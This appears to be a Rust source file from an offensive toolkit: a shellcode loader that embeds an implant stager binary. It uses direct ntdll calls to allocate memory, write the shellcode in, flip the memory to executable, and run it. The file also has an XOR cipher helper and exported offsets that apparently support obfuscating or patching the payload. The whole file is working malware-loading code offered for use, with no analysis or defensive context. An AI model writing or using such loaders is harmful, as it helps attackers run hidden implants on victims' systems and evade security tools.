use std::{ffi::c_void, ptr::null_mut};

use shelly_lib::{consts::CURRENT_PROCESS, instance::Instance};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

static SHELLCODE: &[u8] = include_bytes!("../../implants/stager.bin");

#[unsafe(no_mangle)]
#[allow(non_upper_case_globals)]
static mut _data_offset: usize = 0;
#[unsafe(no_mangle)]
#[allow(non_upper_case_globals)]
static mut _epilogue_offset: usize = 0;

pub const fn xor_cipher<const N: usize>(input: &[u8], key: u8) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = input[i] ^ key;
        i += 1;
    }
    out
}

fn main() {
    let instance = Instance::new();
    println!("[*] Allocated Memory");

    let mut ptr = null_mut();
    let mut region_size = SHELLCODE.len();

    unsafe {
        (instance.ntdll.nt_allocate_virtual_memory)(
            CURRENT_PROCESS,
            &raw mut ptr,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    println!("[*] Write Memory");
    let mut bytes_written = 0;

    unsafe {
        (instance.ntdll.nt_write_virtual_memory)(
            CURRENT_PROCESS,
            ptr,
            SHELLCODE.as_ptr() as _,
            SHELLCODE.len() as _,
            &mut bytes_written,
        )
    };

    println!("[*] Adjust Memory Permission");
    unsafe {
        (instance.ntdll.nt_protect_virtual_memory)(
            CURRENT_PROCESS,
            &raw mut ptr,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut 0,
        )
    };

    let ptr = ptr as usize;

    println!("[*] Run Code");
    let run: extern "C" fn() = unsafe { std::mem::transmute(ptr as *const c_void) };
    let _res = run();
}
